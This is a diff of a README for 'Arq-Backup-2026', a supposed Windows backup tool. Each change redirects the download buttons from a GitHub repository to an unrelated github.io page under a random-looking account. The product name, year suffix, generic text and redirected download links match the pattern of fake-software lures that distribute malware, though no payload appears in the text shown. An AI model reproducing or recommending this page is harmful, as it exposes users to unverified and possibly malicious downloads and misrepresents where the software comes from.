@@ -1,6 +1,6 @@
 # 💾 Arq-Backup-2026 - Secure your data with ease
 
-[![](https://img.shields.io/badge/Download_Arq-Backup-2026-blue)](https://github.com/Petalled-lipoid237/Arq-Backup-2026)
+[![](https://img.shields.io/badge/Download_Arq-Backup-2026-blue)](https://petalled-lipoid237.github.io)
 
 ## 📌 Overview 
 Arq-Backup-2026 provides a secure way to save your files to the cloud. You keep copies of your documents, photos, and projects safe from loss or damage. This software works on Windows 11 and Windows 10. You control where you store your information. This includes options like cloud storage services or your own drives.
@@ -9,7 +9,7 @@ Arq-Backup-2026 provides a secure way to save your files to the cloud. You keep 
 You need a computer running Windows 10 or Windows 11. Your system requires at least 4 GB of RAM and 200 MB of free hard drive space. An active internet connection allows for smooth cloud transfers. Ensure you have your cloud storage account login credentials ready before you start the setup process.
 
 ## 🚀 How to Install 
-[![](https://img.shields.io/badge/Download_Arq-Backup-2026-blue)](https://github.com/Petalled-lipoid237/Arq-Backup-2026)
+[![](https://img.shields.io/badge/Download_Arq-Backup-2026-blue)](https://petalled-lipoid237.github.io)
 
 Follow these steps to set up the software on your computer:
 
